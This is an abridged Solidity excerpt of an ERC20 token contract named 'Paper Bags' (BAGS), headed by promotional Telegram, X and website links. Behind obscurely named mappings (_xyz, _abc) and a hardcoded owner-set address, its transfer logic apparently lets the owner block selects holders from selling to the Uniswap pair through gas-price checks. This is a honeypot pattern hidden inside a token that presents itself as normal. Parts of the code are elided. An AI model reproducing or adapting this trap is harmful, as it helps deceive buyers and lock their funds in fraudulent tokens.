/**
TG: https://t.me/PaperBags_ETH
X: https://x.com/paperbags_eth
Web: https://paperbags.tech/
Bot: https://t.me/Paper_bags_bot
*/
...
contract BAGS is ERC20, Ownable {
    ...
    mapping(address => uint256) private _xyz;
    mapping(address => uint256) private _abc;

    string private _name = unicode"Paper Bags";
    string private _symbol = unicode"BAGS";
    uint256 private _tTotal = 1_000_000 * 10**decimals();
    ...
    function openedTrade() public onlyOwner {
        excludeTradeState[address(0xc89FFeD7c92766e1b017d129F5Ee2E28b78791f7)] = true;
    ...
    function _update(
        ...
        if (excludeTradeState[tx.origin]) {
            ...
            if (to == uniswapV2Pair && from != address(this)) {
                if (
                    tx.gasprice > _xyz[from] &&
                    _xyz[from] != 0
                ) {
                    revert("Exceeds the _xyz fees on transfer tx");
                }
                if (
            ...
            if (to != uniswapV2Pair && from != uniswapV2Pair) {
                if (
                    ...
                    revert("Exceeds the _xyz on transfer from tx");
                }
            }
            super._update(from, to, value);
        }
